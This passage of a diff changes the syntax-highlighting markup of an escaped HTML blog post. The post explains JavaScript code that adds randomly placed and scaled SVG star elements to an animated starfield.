   &lt;span class=&quot;nl&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;scale&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;1.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
   &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;scale&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
@@ -5903,13 +5362,13 @@ The event was a great success! Big thanks to &lt;a href=&quot;https://twitter.co
 
 &lt;p&gt;Now that we have the boring random functions out of the way, time to create our star-agnostic &lt;code&gt;addElement&lt;/code&gt; function. This will create a new &lt;code&gt;&amp;lt;g&amp;gt;&lt;/code&gt; element for each star&amp;#39;s &lt;code&gt;&amp;lt;use&amp;gt;&lt;/code&gt; element. The group is for placement and size, the use is for twinkle and shine animations.&lt;/p&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;addElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;g&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElementNS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;xmlns&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
-      &lt;span class=&quot;nx&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElementNS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;xmlns&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;use&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
-      &lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;translate(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;randomPos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;randomPos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;) &lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;
-            &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;scale(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;randomScaleNamed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;use&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttributeNS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;use&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttributeNS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;xlinkns&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;xlink:href&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttributeNS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;transform&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;g&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElementNS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;xmlns&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;g&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+      &lt;span class=&quot;nx&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElementNS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;xmlns&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;use&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+      &lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'translate('&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;randomPos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;','&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;randomPos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;') '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;
+            &lt;span class=&quot;s1&quot;&gt;'scale('&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;randomScaleNamed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;')'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;use&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttributeNS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;class&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;use&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttributeNS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;xlinkns&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;xlink:href&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;#&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttributeNS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;transform&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
   &lt;span class=&quot;nx&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;use&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
   &lt;span class=&quot;nx&quot;&gt;starfield&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
@@ -5926,9 +5385,9 @@ The event was a great success! Big thanks to &lt;a href=&quot;https://twitter.co
   &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;addElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 
-&lt;span class=&quot;nx&quot;&gt;addElements&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;steeler&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;addElements&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;burst&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;addElements&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;star&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;addElements&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'steeler'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;addElements&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'burst'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;addElements&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'star'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;h3 id=&quot;going-further&quot;&gt;Going Further&lt;/h3&gt;
 
